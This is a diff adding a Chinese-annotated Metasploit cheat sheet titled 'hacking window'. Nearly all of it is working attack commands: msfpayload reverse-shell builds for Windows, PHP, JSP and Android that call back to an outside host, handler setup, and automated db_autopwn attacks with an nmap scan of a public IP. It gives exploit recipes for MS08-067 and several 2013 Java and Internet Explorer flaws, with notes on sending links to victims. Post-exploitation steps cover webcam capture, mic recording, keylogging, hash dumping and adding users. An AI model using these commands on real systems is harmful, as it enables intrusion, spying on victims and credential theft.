@@ -1,0 +1,128 @@
+﻿hacking window
+
+JSP
+msfpayload windows/meterpreter/reverse_tcp LHOST=menux.vicp.cc LPORT=1231 | msfencode -t php -o ~/Desktop/2.php
+msfpayload java/jsp_shell_reverse_tcp LHOST=192.168.10.1 R > balckrootkit.jsp
+msf > use exploit/multi/handler
+msf exploit(handler) > set PAYLOAD java/jsp_shell_reverse_tcp
+set PAYLOAD java/jsp_shell_reverse_tcp
+msf exploit(handler) > set LHOST 192.168.10.1
+LHOST => 192.168.10.1
+
+sudo msfpayload android/meterpreter/reverse_tcp LHOST=192.168.1.104 lport=1123 R > ~/Desktop/f.apk
+use multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost
+set lport
+mkdir生成目录
+rmdir删除目录
+camera_snap （（从受害人的主摄像头拍摄快照） ）
+webcam_list列表摄像头
+webcam_snap拍摄快照从指定的网络摄像头
+webcam_stream从指定的摄像头播放的视频流
+record_mic  （用于麦克风录音）
+cd/sdcard （浏览受害者SD卡中的文件） 
+shell
+help
+
+
+
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=menux.vicp.cc LPORT=2216 x>/root/Desktop/z.exe
+use exploit/multi/handler
+show options
+set LHOST
+SET LPORT
+EXPLOIT -Z -J
+background   //把回话放在
+search windows/local  //搜索本地提权
+use 模块
+set session  *
+set payload windows/meterpreter/reverse_tcp
+
+ms13_080
+use exploit/windows/browser/ms13_080_cdisplaypointer
+set PYLOAD windows/meterpreter/reverse_tcp
+set LHOST
+set SRVHOST
+set URIPATH jura.ba
+
+
+
+
+msfconsole   
+自动攻击  //新版需要下载db_autopwn
+load db_autopwn
+db_hosts   //查看历史结果
+db_del hosts 127.0.0.1  //删除历史
+db_nmap -T  Aggressive -sV -n -O -v  60.210.118.67
+ //调用NMAP扫描并把结果存到历史，-T 速度，-sV服务扫描 -n不做解析 -O判断操作系统 -v详细显示操作过程
+db_services //查看这个目标所提供服务器
+db_autopwn -h  //自动攻击查看帮助   -p 通过开放端口选择攻击模块 -t 展示所有攻击模块 -i 指定攻击目标主机 -e 对所以可以攻击的对象攻击
+db_autopwn -p -t -e  //因为数据库只有一个目标所以不用指定目标
+攻击完毕
+getuid            //看看我是谁
+sysinfo           //查看系统信息
+run hashdump    //导出系统hash
+ps                          //查看系统进程
+migrate 进程ID    //切换为该进程，变成管理员权限
+keyscan_start     //键盘记录
+run getgui -e      //把远程桌面
+run getgui -u user -p pass   //添加用户
+
+
+-------------------------------------------------------------------
+1.ms08_067(KB958644)  //这个是用来渗透XPSP3的
+的查看存活主机
+nmap -sP 192.168.239.0/255
+查看操作系统
+nmap -O 192.168.239.133
+查看主机个服务器的版本详细信息
+nmap -sV 192.168.239.133
+扫描漏洞
+nmap -sS -sV -O -script=smb-check-vulns.nse 192.168.142.132   //这个扫nmap扫描漏洞用的
+------------------------------------------------------------------
+use exploit/windows/smb/ms08_067_netapi
+set RHOST  目标IP
+set LHOST 本机IP
+set PYLOAD windows/meterpreter/reverse_tcp
+exploit                //执行后反弹shell
+screenshot       //查看截图
+setdesktop
+exit
+------------------------------------------------------------------
+2.CVE-2013-0422   //这个比较不错，今年出的
+影响;JAVA17    
+use exploit/multi/browser/java_jre17_jmxbean
+set SRVHOST 本机IP
+set TARGET 1 //选择系统
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 本机IP
+exploit            //生成链接发送对方
+sessions -i 1  //反弹shell
+-----------------------------------------------------------------------
+3.CVE-2013-1347  
+影响：IE8
+use exploit/windows/browser/ie_cgenericelement_uaf
+set SRVHOST 本机IP
+show targets    //选择系统
+set TARGET 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 本机IP
+exploit          //生成链接发送对方
+sessions -i 1
+---------------------------------------------------------
+4.CVE-2013-0027   //这个是比较大的漏洞，也是经常用到
+影响：IE10,9,8,7,6
+use exploit/windows/browser/ms13_009_ie_slayoutrun_uaf
+set SRVHOST 本机IP
+show targets  //选择系统
+set TARGET 1
+set payload windows/meterpreter/reverse_tcp
+set LHOST 本机IP
+exploit  //生成链接发送对方
+sessions -i 1
+-------------------------------------------------------------
+
+
+
